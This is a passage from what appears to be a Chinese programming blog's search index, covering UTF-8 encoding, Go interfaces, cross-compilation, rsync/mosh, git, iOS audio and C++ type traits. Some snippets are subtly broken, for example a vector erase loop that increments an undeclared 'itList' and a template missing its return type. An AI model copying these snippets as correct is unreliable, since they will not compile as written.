//speex版本\nospeex_version_id = 1 \t\t\t//speex版本id\nheader_size = 80 \t \t\t\t//speex头信息大小\nrate = 16000\t\t\t\t\t//采样率大小\nmode = 1\t\t\t \t\t\t//mode  0是窄带模式, 1是宽带模式 (0=NB, 1=WB, 2=UWB)\nbitrate = -1 \t\t \t\t\t//比特率\nframe_size = 320   \t \t\t\t//缓冲区大小  窄带对应160, 宽带对应320  (NB=160, WB=320, UWB=640)\nvbr = 1\t\t\t\t\t\t//是否使用可变比特率\nnframes  = 1 \t\t\t\t\t// 每帧的speex包的数量\nchannels =1    \t\t\t        //音频输入的声道 \t1是单声道，2是立体声\n```","tags":["音频"],"categories":["计算机基础"]},{"title":"字符编码","url":"%2Fp%2Febfb97d0.html","content":"\n### ASCII码\nASCII码的取值范围是0~127，可以用7个bit表示。C语言中char型变量的大小规定为一字节，如果存放ASCII码则只用到低7位，高位为0。以下是ASCII码表：\n\n\n绝大多数计算机的一个字节是8位，取值范围是0~255，而ASCII码并没有规定编号为128~255的字符，为了能表示更多字符，各厂商制定了很多种ASCII码的扩展规范。注意，虽然通常把这些规范称为扩展ASCII码（Extended ASCII），但其实它们并不属于ASCII码标准。\n\n<!-- more -->\n\n### Unicode和UTF-8\n\n为了统一全世界各国语言文字和专业领域符号（例如数学符号、乐谱符号）的编码，ISO制定了ISO 10646标准，也称为UCS（Universal Character Set）。UCS编码的长度是31位，可以表示231个字符。如果两个字符编码的高位相同，只有低16位不同，则它们属于一个平面（Plane），所以一个平面由216个字符组成。目前常用的大部分字符都位于第一个平面（编码范围是U-00000000~U-0000FFFD），称为BMP（Basic Multilingual Plane）或Plane 0，为了向后兼容，其中编号为0~256的字符和Latin-1相同。UCS编码通常用U-xxxxxxxx这种形式表示，而BMP的编码通常用U+xxxx这种形式表示，其中x是十六进制数字。在ISO制定UCS的同时，另一个由厂商联合组织也在着手制定这样的编码，称为Unicode，后来两家联手制定统一的编码，但各自发布各自的标准文档，所以UCS编码和Unicode码是相同的。\n\n\n有了字符编码，另一个问题就是这样的编码在计算机中怎么表示。现在已经不可能用一个字节表示一个字符了，最直接的想法就是用四个字节表示一个字符，这种表示方法称为UCS-4或UTF-32，UTF是Unicode Transformation Format的缩写。一方面这样比较浪费存储空间，由于常用字符都集中在BMP，高位的两个字节通常是0，如果只用ASCII码或Latin-1，高位的三个字节都是0。另一种比较节省存储空间的办法是用两个字节表示一个字符，称为UCS-2或UTF-16，这样只能表示BMP中的字符，但BMP中有一些扩展字符，可以用两个这样的扩展字符表示其它平面的字符，称为Surrogate Pair。无论是UTF-32还是UTF-16都有一个更严重的问题是和C语言不兼容，在C语言中0字节表示字符串结尾，库函数strlen、strcpy等等都依赖于这一点，如果字符串用UTF-32存储，其中有很多0字节并不表示字符串结尾，这就乱套了。\n\n\n\nUNIX之父Ken Thompson提出的UTF-8编码很好地解决了这些问题，现在得到广泛应用。\n\nUTF-8具有以下性质：\n\n\n  ● 编码为U+0000~U+007F的字符只占一个字节，就是0x00~0x7F，和ASCII码兼容。\n\n  ● 编码大于U+007F的字符用2~6个字节表示，每个字节的最高位都是1，而ASCII码的最高位都是0，因此非ASCII码字符的表示中不会出现ASCII码字节（也就不会出现0字节）。\n\n  ● 用于表示非ASCII码字符的多字节序列中，第一个字节的取值范围是0xC0~0xFD，根据它可以判断后面有多少个字节也属于当前字符的编码。后面每个字节的取值范围都是0x80~0xBF，见下面的详细说明。\n\n  ● UCS定义的所有231个字符都可以用UTF-8编码表示出来。\n\n  ● UTF-8编码最长6个字节，BMP字符的UTF-8编码最长三个字节。\n\n  ● 0xFE和0xFF这两个字节在UTF-8编码中不会出现。\n\n具体来说，UTF-8编码有以下几种格式：\n\n```\nU-00000000 – U-0000007F:  0xxxxxxx\nU-00000080 – U-000007FF:  110xxxxx 10xxxxxx\nU-00000800 – U-0000FFFF:  1110xxxx 10xxxxxx 10xxxxxx\nU-00010000 – U-001FFFFF:  11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\nU-00200000 – U-03FFFFFF:  111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\nU-04000000 – U-7FFFFFFF:  1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n```\n第一个字节要么最高位是0（ASCII字节），要么最高两位都是1，\n\n最高位之后1的个数决定后面有多少个字节也属于当前字符编码，例如111110xx，最高位之后还有四个1，表示后面有四个字节也属于当前字符的编码。后面每个字节的最高两位都是10，可以和第一个字节区分开。这样的设计有利于误码同步，例如在网络传输过程中丢失了几个字节，很容易判断当前字符是不完整的，也很容易找到下一个字符从哪里开始，结果顶多丢掉一两个字符，而不会导致后面的编码解释全部混乱了。上面的格式中标为x的位就是UCS编码，最后一种6字节的格式中x位有31个，可以表示31位的UCS编码，UTF-8就像一列火车，第一个字节是车头，后面每个字节是车厢，其中承载的货物是UCS编码。UTF-8规定承载的UCS编码以大端表示，也就是说第一个字节中的x是UCS编码的高位，后面字节中的x是UCS编码的低位。\n例如U+00A9（©字符）的二进制是10101001，编码成UTF-8是11000010 10101001（0xC2 0xA9），但不能编码成11100000 10000010 10101001，UTF-8规定每个字符只能用尽可能少的字节来编码。\n\n\n```\n10101001\n11000010 10101001     \t           // 大端也符合阅读规范\n\n\n10101001\n11100000 10000010 10101001   //这样不可以, 用尽可能少的字节来编码\n```\n\n\n\n### 在Linux C编程中使用Unicode和UTF-8\n\n目前各种Linux发行版都支持UTF-8编码，当前系统的语言和字符编码设置保存在一些环境变量中，可以通过locale命令查看：\n\n```\n$ locale\nLANG=en_US.UTF-8\nLC_CTYPE=\"en_US.UTF-8\"\nLC_NUMERIC=\"en_US.UTF-8\"\nLC_TIME=\"en_US.UTF-8\"\nLC_COLLATE=\"en_US.UTF-8\"\nLC_MONETARY=\"en_US.UTF-8\"\nLC_MESSAGES=\"en_US.UTF-8\"\nLC_PAPER=\"en_US.UTF-8\"\nLC_NAME=\"en_US.UTF-8\"\nLC_ADDRESS=\"en_US.UTF-8\"\nLC_TELEPHONE=\"en_US.UTF-8\"\nLC_MEASUREMENT=\"en_US.UTF-8\"\nLC_IDENTIFICATION=\"en_US.UTF-8\"\nLC_ALL=\n```\n常用汉字也都位于BMP中，所以一个汉字的存储通常占3个字节。\n\n\n\n\n例如编辑一个C程序：\n\n```\n#include <stdio.h>\n\nint main(void)\n{\n\tprintf(\"你好\\n\");\n\treturn 0;\n}\n```\n源文件是以UTF-8编码存储的：\n\n```\n$ od -tc nihao.c \n0000000   #   i   n   c   l   u   d   e       <   s   t   d   i   o   .\n0000020   h   >  \\n  \\n   i   n   t       m   a   i   n   (   v   o   i\n0000040   d   )  \\n   {  \\n  \\t   p   r   i   n   t   f   (   \" 344 275\n0000060 240 345 245 275   \\   n   \"   )   ;  \\n  \\t   r   e   t   u   r\n0000100   n       0   ;  \\n   }  \\n\n0000107\n```\n其中八进制的344 375 240（十六进制e4 bd a0）就是“你”的UTF-8编码，八进制的345 245 275（十六进制e5 a5 bd）就是“好”。把它编译成目标文件，\"你好\\n\"这个字符串就成了这样一串字节：e4 bd a0 e5 a5 bd 0a 00，汉字在其中仍然是UTF-8编码的，一个汉字占3个字节，这种字符在C语言中称为多字节字符（Multibyte Character）。运行这个程序相当于把这一串字节write到当前终端的设备文件。如果当前终端的驱动程序能够识别UTF-8编码就能打印出汉字，如果当前终端的驱动程序不能识别UTF-8编码（比如一般的字符终端）就打印不出汉字。也就是说，像这种程序，识别汉字的工作既不是由C编译器做的也不是由libc做的，C编译器原封不动地把源文件中的UTF-8编码复制到目标文件中，libc只是当作以0结尾的字符串原封不动地write给内核，识别汉字的工作是由终端的驱动程序做的。\n\n\n\n但是仅有这种程度的汉字支持是不够的，有时候我们需要在C程序中操作字符串里的字符，比如求字符串\"你好\\n\"中有几个汉字或字符，用strlen就不灵了，因为strlen只看结尾的0字节而不管字符串里存的是什么，求出来的是字节数7。为了在程序中操作Unicode字符，C语言定义了宽字符（Wide Character）类型wchar_t和一些库函数。\n\n\n在字符常量或字符串字面值前面加一个L就表示宽字符常量或宽字符串，例如定义wchar_t c = L'你';，变量c的值就是汉字“你”的31位UCS编码，而L\"你好\\n\"就相当于{L'你', L'好', L'\\n', 0}，wcslen函数就可以取宽字符串中的字符个数。\n\n\n```\n#include <stdio.h>\n#include <locale.h>\n\nint main(void)\n{\n\tif (!setlocale(LC_CTYPE, \"\")) {\n\t\tfprintf(stderr, \"Can't set the specified locale! \"\n\t\t\t\"Check LANG, LC_CTYPE, LC_ALL.\\n\");\n\t\treturn 1;\n\t}\n\tprintf(\"%ls\", L\"你好\\n\");\n\treturn 0;\n}\n```\n\n宽字符串L\"你好\\n\"在源代码中当然还是存成UTF-8编码的，但编译器会把它变成4个UCS编码0x00004f60 0x0000597d 0x0000000a 0x00000000保存在目标文件中，按小端存储就是60 4f 00 00 7d 59 00 00 0a 00 00 00 00 00 00 00，用od命令查看目标文件应该能找到这些字节。\n\n\nprintf的%ls转换说明表示把后面的参数按宽字符串解释，不是见到0字节就结束，而是见到UCS编码为0的字符才结束，但是要write到终端仍然需要以多字节编码输出，这样终端驱动程序才能识别，所以printf在内部把宽字符串转换成多字节字符串再write出去。事实上，C标准并没有规定多字节字符必须以UTF-8编码，也可以使用其它的多字节编码，在运行时根据环境变量确定当前系统的编码，所以在程序开头需要调用setlocale获取当前系统的编码设置，如果当前系统是UTF-8的，printf就把UCS编码转换成UTF-8编码的多字节字符串再write出去。一般来说，程序在做内部计算时通常以宽字符编码，如果要存盘或者输出给别的程序，或者通过网络发给别的程序，则采用多字节编码。","tags":["字符"],"categories":["计算机基础"]},{"title":"golang的继承和多态","url":"%2Fp%2Fa5099912.html","content":"\n\n# 1. interface struct 能否相互嵌套\n\n1. struct struct //继承(不能多态), 如果内部struct实现了接口, 它也相当于实现了接口\n2. struct interface //可以内部用interface多态\n3. interface interface  //单纯的导入\n4. interface struct  //不允许\n\n<!-- more -->\n\n# 2. struct方法参数定义指针还是值 \n\n无论方法参数定义成指针还是值, 都可以调用\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype S struct {\n\tage int\n}\n\nfunc (s S) Value() {\n\tfmt.Println(s.age)\n}\n\nfunc (s *S) Point(age int) {\n\ts.age = age\n}\n\nfunc main() {\n\n\t// 自己是指针, 能够调用一切\n\ts := new(S)\n\ts.Point(1)\n\ts.Value()      //1\n\tfmt.Println(s) //&{1}\n\n\t// 自己不是指针,也能调用指针函数修改值\n\tv := S{}\n\tv.Point(2)\n\tv.Value()      //2\n\tfmt.Println(v) //{2}\n}\n```\n\n\n\n# 3. interface 能否赋值实现了的 struct\n\n### 3.1 struct是值的都可以赋值\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype I interface {\n\tGet()\n}\ntype S struct {\n}\n\nfunc (s S) Get() {\n\tfmt.Println(\"get\")\n}\n\nfunc main() {\n\n\tvar i I\n\n\ti = S{}\n\ti.Get() // get\n\n\ti = &S{}\n\ti.Get() //get\n}\n```\n\n### 3.2 struct是指针的只能指针赋值\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype I interface {\n\tGet()\n}\ntype S struct {\n}\n\nfunc (s *S) Get() {\n\tfmt.Println(\"get\")\n}\n\nfunc main() {\n\n\tvar i I\n\n\t//i = S{} //此处不能赋值，这一行就直接报错。\n\t//i.Get()\n\n\ti = &S{}\n\ti.Get() //get\n}\n```\n\n\n\n# 4. interface实现多态\n\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype P interface {\n\tSay()\n}\ntype P1 struct{}\ntype P2 struct{}\n\nfunc (p *P1) Say() {\n\tfmt.Println(\"say p1\")\n}\nfunc (p *P2) Say() {\n\tfmt.Println(\"say p2\")\n}\n\nfunc main() {\n\tp1 := &P1{}\n\tp2 := &P2{}\n\n\tvar p P\n\tp = p1\n\tp.Say() // say p1\n\tp = p2\n\tp.Say() // say p2\n}\n```\n\n\n\n# 5. 组合继承并不会多态\n\ngo 语言中，当子类调用父类方法时，“作用域”将进入父类的作用域，看不见子类的方法存在。\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype A struct {\n}\n\nfunc (a *A) ShowA() {\n\tfmt.Println(\"showA\")\n\ta.ShowB()\n}\nfunc (a *A) ShowB() {\n\tfmt.Println(\"showB\")\n}\n\ntype B struct {\n\tA\n}\n\nfunc (b *B) ShowB() {\n\tfmt.Println(\"b showB\")\n}\n\nfunc main() {\n\tb := B{}\n\tb.ShowA()\n}\n\n// showA\n// showB,  not b showB\n```\n\n","tags":["golang"],"categories":["1_golang基础"]},{"title":"golang多平台交叉编译","url":"%2Fp%2F37af4aa1.html","content":"\n\n### cannot execute binary file exec format error\n\n是因为mac和ubuntu的二进制格式不一致\n\n\n### 问题\n\nGo是一门编译型语言，所以在不同平台上，需要编译生成不同格式的二进制包。\n由于Go 1.5对跨平台编译有了一些改进，包括统一了编译器、链接器等。\n编译时候只需要指定两个参数：GOOS和GOARCH即可。\n\n\n<!-- more -->\n\n\n### 编译到 linux 64bit\n```\n$ GOOS=linux GOARCH=amd64 go build\n```\n### 或者可以使用 -o 选项指定生成二进制文件名字\n```\n$ GOOS=linux GOARCH=amd64 go build -o app.linux\n```\n### 编译到 linux 32bit\n```\n$ GOOS=linux GOARCH=386 go build\n```\n### 编译到 windows 64bit\n```\n$ GOOS=windows GOARCH=amd64 go build\n```\n\n### 编译到 windows 32bit\n```\n$ GOOS=windows GOARCH=386 go build\n```\n\n### 编译到 Mac OS X 64bit\n```\n$ GOOS=darwin GOARCH=amd64 go build\n```","tags":["golang"],"categories":["3_golang杂项"]},{"title":"rsync同步文件","url":"%2Fp%2Ff67a2ed5.html","content":"\n\n参考链接: http://blog.csdn.net/zpf336/article/details/51659666\n\n\n### 把本地文件同步到远程服务器\n```\nrsync -avz '-e ssh -i /Users/liuwei/.ssh/aws.pem' /Users/liuwei/golang/src/web --progress ubuntu@54.191.9.26:/home/ubuntu\n```\n\n<!-- more -->\n### client\n\n```\nrsync -vzrtopg --progress  ubuntu@54.191.9.26::ftp .   //同步服务器的文件到当前目录\n```\n\n### server\n\n```\n[ftp]\n\n        comment = public archive\n        path = /home/ubuntu/rsync\n        use chroot = yes\n#       max connections=10\n        lock file = /var/lock/rsyncd\n# the default for read only is yes...\n        read only = yes\n        list = yes\n        uid = nobody\n        gid = nogroup\n#       exclude =\n#       exclude from =\n#       include =\n#       include from =\n        auth users =  ubuntu\n        secrets file = /etc/rsyncd.secrets\n        strict modes = yes\n#       hosts allow =\n#       hosts deny =\n        ignore errors = no\n        ignore nonreadable = yes\n        transfer logging = no\n#       log format = %t: host %h (%a) %o %f (%l bytes). Total %b bytes.\n        timeout = 600\n        refuse options = checksum dry-run\n        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz\n\n```\n\n\n\n### 在本地机器上对两个目录同步\n\n```\nrsync -zvr filename1 filename2\n```\n上述代码是将filename1中的文件与filename2中的文件同步\n\n### 使用rsync –a 同步保留时间按标记\n\n```\nrsync -azv filename1 filename2  \n```\n\n使用上述命令，将filename2中新同步的文件的时间与filename1中的创建的时间相同，它保留符号链接、权限、时间标记、用户名及组名相同。\n\n### 将远程服务器的文件同步到本地\n\n```\nrsync -avz ubuntu@192.168.0.1:/home/ubuntu/filename2 filename1 \n```\n\n上述命令是将远程192.168.0.1的主机上filename2同步到本地的filename1。\n注意：如果远程主机的端口不是默认的22端口，假如是4000端口，上述的命令修改为，\n\n```\nrsync -avz '-e ssh -p 4000' ubuntu@192.168.0.1:/home/ubuntu/filename2 filename1 \n```\n\n### 从本地同步文件到远程服务器\n\n```\nrsync -avz filename1 ubuntu@192.168.0.1:/home/ubuntu/filename2  \n```\n上述命令是将本地的filename1同步到远程192.168.0.1的主机上。\n同理如果端口不是22，使用以下命令\n\n```\nrsync -avz '-e ssh -p 4000' filename1 ubuntu@192.168.0.1:/home/ubuntu/filename2  \n```\n","tags":["linux"],"categories":["命令"]},{"title":"mosh解决ssh远程连接延迟","url":"%2Fp%2F21b6636c.html","content":"\n\n### 安装mosh\n```\nsudo apt-get install mosh //server\nbrew install mobile-shell //mac\n```\n\n\n### 需要先设置本地\nlocale-gen zh_CN.UTF-8\n\n### 远程服务器开启 mosh-server\n\n### 需要aws开启udp mosh的端口\n\n### 客户端连接\n\n```\n mosh ubuntu@ec2-54-191-9-26.us-west-2.compute.amazonaws.com -ssh=\"ssh -i 'aws.pem'\"\n```\n","tags":["linux"],"categories":["命令"]},{"title":"gitHub提交PullRequest","url":"%2Fp%2Fa35ae0bf.html","content":"\n\n### fork别人的仓库\n首先，在 GitHub 上 fork 到自己的仓库，如 docker_user/blockchain_guide，然后 clone 到本地，并设置用户信息。\n\n```\n$ git clone git@github.com:docker_user/blockchain_guide.git\n$ cd blockchain_guide\n$ #do some change on the content\n$ git commit -am \"Fix issue #1: change helo to hello\"\n$ git push\n```\n\n<!-- more -->\n\n### [remote rejected] master -> master (permission denied)\n\n```\nType command:\n\ngit config --global --edit\nAdd these lines of configuration at the end of file:\n\n[credential]\n  helper = osxkeychain\n  useHttpPath = true\n```\n\n\n### 更新自己的仓库\n\n  ```\n  git remote add upstream https://github.com/unix2dos/GolangWeb\n  git fetch upstream\n  git checkout master\n  git rebase upstream/master\n  git push -f origin master\n  ```\n","tags":["git"],"categories":["git"]},{"title":"iOS录音遇到的问题","url":"%2Fp%2F9ecea432.html","content":"### iOS使用openAL控制声音的输出设备\n项目中播放ios录音的时候使用的是AVAudio相关库, 播放音效又是用的openAL.\n如果同时或交替播放这两类声音, 会造成声音一会从听筒发声,一会从扬声器发声.\n千辛万苦找到解决方案:\n\n```cpp\nInteresting enough, it can be done!\n\nBasically you add a property listener to get route change events:\n    AudioSessionAddPropertyListener(kAudioSessionProperty_AudioRouteChange, audioRouteChangeListenerCallback,0);\n\n\tThen in the callback, determine if its a headphone being plugged-in and override the audio route:\n\t        UInt32 audioRouteOverride = kAudioSessionOverrideAudioRoute_Speaker;\n\t\t\t        AudioSessionSetProperty(kAudioSessionProperty_OverrideAudioRoute, sizeof(audioRouteOverride), &audioRouteOverride);\n\n\t\t\t\t\tToo simple...\n```\n\n\n### iOS AVAudioSession 监听静音开关\n录音使用AVAudioSession播放的时候, 无法识别Iphone手机的物理静音开关,需要修改下模式\n\n\n```\n[[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryPlayback error:nil];\n```\n\n修改成\n        \n```\n[[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategorySoloAmbient error:nil];//监听静音\n```\n\n\n\n","tags":["ios"],"categories":["ios"]},{"title":"c++stl容器循环earse用法","url":"%2Fp%2F6556ac6a.html","content":"\n### vector deque\n在使用 vector、deque遍历删除元素时，也可以通过erase的返回值来获取下一个元素的位置：\n\n```\n      std::vector< int> Vec;\n      std::vector< int>::iterator itVec;\n      for( itVec = Vec.begin(); itVec != Vec.end(); )\n      {\n            if( WillDelete( *itVec) )\n            {\n                 itVec = Vec.erase( itVec);\n            }\n            else\n               itList++;\n      }\n```\n<!-- more -->\n\n### list set map \n在 使用 list、set 或 map遍历删除某些元素时可以这样使用：\n\n```\n      std::list< int> List;\n      std::list< int>::iterator itList;\n      for( itList = List.begin(); itList != List.end(); )\n      {\n            if( WillDelete( *itList) )\n            {\n               itList = List.erase( itList);\n            }\n            else\n               itList++;\n      }\n```\n\n\n```\n      std::list< int> List;\n      std::list< int>::iterator itList;\n      for( itList = List.begin(); itList != List.end(); )\n      {\n            if( WillDelete( *itList) )\n            {\n               List.erase( itList++);\n            }\n            else\n               itList++;\n      }\n```\n","tags":["c++"],"categories":["c++"]},{"title":"c++11的模板类型判断std::is_same和std::decay","url":"%2Fp%2F1e4be646.html","content":"\n问题提出：有一个模板函数，函数在处理int型和double型时需要进行特殊的处理，那么怎么在编译期知道传入的参数的数据类型是int型还是double型呢？ \n如：\n\n\n```cpp\n#include <iostream>\ntemplate <typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    //do something check data type\n\t//std::cout<< out put the type\n}\n```\n\n这里就需要用到C++11的type_traits头文件了，type_traits头文件定义了很多类型检查相关的方法，上面的例子具体用到了其中两个结构：\n\n<!-- more -->\n\n## std::is_same 判断类型是否一致\n\n位于头文件`<type_traits>`中\n这个结构体作用很简单，就是两个一样的类型会返回true\n\n```cpp\nbool isInt = std::is_same<int, int>::value; //为true\n```\n\n下面是官方的例子：\n\n```cpp\n#include <iostream>\n#include <type_traits>\n#include <cstdint>\n\nvoid print_separator()\n{\n    std::cout << \"-----\\n\";\n}\n\nint main()\n{\n    std::cout << std::boolalpha;\n\n    std::cout << std::is_same<int, int32_t>::value << '\\n';   // true\n    std::cout << std::is_same<int, int64_t>::value << '\\n';   // false\n    std::cout << std::is_same<float, int32_t>::value << '\\n'; // false\n\n    print_separator();\n\n    std::cout << std::is_same<int, int>::value << \"\\n\";          // true\n    std::cout << std::is_same<int, unsigned int>::value << \"\\n\"; // false\n    std::cout << std::is_same<int, signed int>::value << \"\\n\";   // true\n\n    print_separator();\n\n    // unlike other types 'char' is not 'unsigned' and not 'signed'\n    std::cout << std::is_same<char, char>::value << \"\\n\";          // true\n    std::cout << std::is_same<char, unsigned char>::value << \"\\n\"; // false\n    std::cout << std::is_same<char, signed char>::value << \"\\n\";   // false\n}\n```\n\n通过std::is_same即可判断两个类型是否一样，特别在模板里面，在不清楚模板的参数时，此功能可以对一些特定的参数类型进行特殊的处理。\n\n<!-- more -->\n\n> 这里说个题外话，大家是否通过std::is_same发现，char既不是unsigned char也不是signed char，char就是char，这和int是signed int的缩写是不一样的，char的表达范围可能等同于signed char，也可能等同于unsigned char，取决于编译器，一般是等同于signed char，但这个仅仅是范围等同，就像32位上int和long范围是一样的，但不是同一个类型。\n> \n> 因为用途不同，char用于表达字符，理论上不应该关心其正负的实现，而signed char 和 unsigned char 用于表达数值，或可移植的char。\n\n\n回到正文，std::is_same可以判断两种类似是否一样，那么用在模板里就是利器了，本位一开始提到的那个问题就可以这样写：\n\n```cpp\n#include <iostream>\ntemplate<typename TYPE>\ntypeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\";\n        //do something int \n    }\n    else\n    {\n        //.........\n    }\n}\n```\n\n看似很美好，再看一个示例：\n\n```cpp\n// is_same example\n#include <iostream>\n#include <type_traits>\n#include <cstdint>\n\ntypedef int integer_type;\nstruct A { int x,y; };\nstruct B { int x,y; };\ntypedef A C;\n\nint main() {\n      std::cout << std::boolalpha;\n      std::cout << \"is_same:\" << std::endl;\n      std::cout << \"int, const int: \" << std::is_same<int, const int>::value << std::endl;//false\n      std::cout << \"int, int&: \" << std::is_same<int, int&>::value << std::endl;//false\n      std::cout << \"int, const int&: \" << std::is_same<int, const int&>::value << std::endl;//false\n      std::cout << \"int, integer_type: \" << std::is_same<int, integer_type>::value << std::endl;//true\n      std::cout << \"A, B: \" << std::is_same<A,B>::value << std::endl;//false\n      std::cout << \"A, C: \" << std::is_same<A,C>::value << std::endl;//true\n      std::cout << \"signed char, std::int8_t: \" << std::is_same<signed char,std::int8_t>::value << std::endl;//true\n      return 0;\n}\n```\n输出：\n\n```cpp\nis_same:\nint, const int: false\nint, int&: false\nint, const int&: false\nint, integer_type: true\nA, B: false\nA, C: true\nsigned char, std::int8_t: true\n```\n\n可以发现std::is_same的判断是很严格的,再看下面的一个例子：\n\n```cpp\n#include <stdlib.h>\n#include <iostream>\n#include <type_traits>\n\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n    const int& e = d[7];\n    typeCheck(a);//int type\n    typeCheck(b);//int type\n    typeCheck(c);//int type\n    typeCheck(d[7]);//int type\n    typeCheck(e);//int type\n    typeCheck(8);//int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else if(std::is_same<TYPE,std::string>::value)\n    {\n        std::cout<<\"string type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\";\n    }\n}\n```\n输出：\n\n```cpp\nint type\nint type\nint type\nint type\nint type\nint type\n```\n\n测试后发现，虽然变量b,c, e使用的是引用，std::is_same那么严格为什么是int_type呢? 因为在写模板函数时，经常会强制指定const引用进行传参，以免进行数据拷贝，这时候is_same就做出了相等的判断.\n\n\n\n> 如果我们显示的指定模板参数类型时情况有不一样了：\n\n```cpp\n#include <stdlib.h>\n#include <iostream>\n#include <type_traits>\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n\n    typeCheck<int>(a);        //int type\n    typeCheck<const int&>(b);//other type\n    typeCheck<int &>(c);        //other type\n    typeCheck<const int&>(d[7]);//other type\n    typeCheck(8);                //int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else if(std::is_same<TYPE,std::string>::value)\n    {\n        std::cout<<\"string type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\";\n    }\n}\n```\n输出：\n\n```cpp\nint type\nother type\nother type\nother type\nint type\n```\n瞬间结果就不一样了，这很好了解，从上面可知道，std::is_same对int\\ const int\\ int &\\ const int& 等都是区别对待的.\n\n\n> 但是有时候其实我们还是希望TYPE和const TYPE& 是能认为是一样的，这时就需要std::decay进行退化处理\n\n\n## std::decay 退化类型的修饰\n\nstd::decay就是对一个类型进行退化处理，他的实现如下:\n\n```cpp\ntemplate< class T >\nstruct decay {\nprivate:\n    typedef typename std::remove_reference<T>::type U;\npublic:\n    typedef typename std::conditional< \n        std::is_array<U>::value,\n        typename std::remove_extent<U>::type*,\n        typename std::conditional< \n            std::is_function<U>::value,\n            typename std::add_pointer<U>::type,\n            typename std::remove_cv<U>::type\n        >::type\n    >::type type;\n};\n```\n看着比较抽象，其实就是把各种引用啊什么的修饰去掉，把cosnt int&退化为int，这样就能通过std::is_same正确识别出加了引用的类型了 \n上面的例子改为：\n\n```cpp\n#include <iostream>\n#include <type_traits>\n\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n\n    typeCheck<int>(a);//int type\n    typeCheck<const int&>(b);//int type\n    typeCheck<int &>(c);//int type\n    typeCheck<const int&>(d[7]);//int type\n    typeCheck(8);//int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<typename std::decay<TYPE>::type,int>::value)//c++11\n    //if(std::is_same<std::decay_t<TYPE>, int>::value)//c++14\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\"<<std::endl;\n    }\n}\n```\n\n在cppref有个更加详细的例子：\n\n```cpp\n#include <iostream>\n#include <type_traits>\n\ntemplate <typename T, typename U>\nstruct decay_equiv : \n    std::is_same<typename std::decay<T>::type, U>::type \n{};\n\nint main()\n{\n    std::cout << std::boolalpha\n              << decay_equiv<int, int>::value << '\\n'\n              << decay_equiv<int&, int>::value << '\\n'\n              << decay_equiv<int&&, int>::value << '\\n'\n              << decay_equiv<const int&, int>::value << '\\n'\n              << decay_equiv<int[2], int*>::value << '\\n'\n              << decay_equiv<int(int), int(*)(int)>::value << '\\n';\n}\n```\n\n输出:\n\n```cpp\ntrue\ntrue\ntrue\ntrue\ntrue\ntrue\n```\n\n## 总结：\n\n+ 在模板里可以通过std::is_same判断模板的类型，从而实现对不同类型的区别对待\n\n+ 在堆类型要求不是非常严格的情况下，可以使用std::decay把类型退化为基本形态，结合std::is_same用，可以判断出更多的情况\n","tags":["c++"],"categories":["c++"]},{"title":"git实用操作总结","url":"%2Fp%2F42eae4e7.html","content":"\n# 1. git 基础操作\n\n### 1.1 git的基础操作\n\n1. 命令git add \t      把文件添加到仓库\n\n2. 命令git commit \t  把文件提交到仓库\n\n3. 命令git pull \t  把远程仓库拉取文件\n\n4. 命令git push       把文件提交到远程仓库\n\n5. 命令git log \t      查看git提交日志\n\n6. 如果嫌输出信息太多, 可以加上--pretty=oneline参数. 另外也可以花式log输出, git lg查看下\n\n   ```bash\n   git config --global alias.lg \"log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit --date=relative\"\n   ```\n\n7. 命令git diff 查看版本之间文件修改变化\n\n   ```bash\n   git diff 87b91b6 f9b3075 [--name-only]加上可以只看文件名字\n   ```\n\n<!-- more -->\n\n\n### 1.2 git 标签操作\n\n命令git tag <name>用于新建一个标签，默认为HEAD，也可以指定一个commit id；\n\ngit tag -a <tagname> -m \"blablabla...\"可以指定标签信息；\n\ngit tag -s <tagname> -m \"blablabla...\"可以用PGP签名标签；\n\n命令git tag可以查看所有标签。\n\n命令git push origin <tagname>可以推送一个本地标签；\n\n命令git push origin --tags可以推送全部未推送过的本地标签；\n\n命令git tag -d <tagname>可以删除一个本地标签；\n\n命令git push origin :refs/tags/<tagname>可以删除一个远程标签。\n\n### 1.3 git 合并 commit\n\n```\ngit rebase -i \"合并前一个版本号\"// 合并前一个 版本号\n\n\tpick 是用commit\n\tsquash 是合并前一个\n\n:wq 退出修改合并后的 commit log\n\ngit rebase --abort 如果出现失误来撤销\n```\n\n\n\n# 2. git 分支\n\n### 2.1 git 分支修改名字\n\n```bash\ngit branch -m 原名 新名\n```\n\n### 2.2  git 批量删除分支 \n\n```bash\ngit branch | grep \"fea\" | xargs git branch -d\ngit branch | 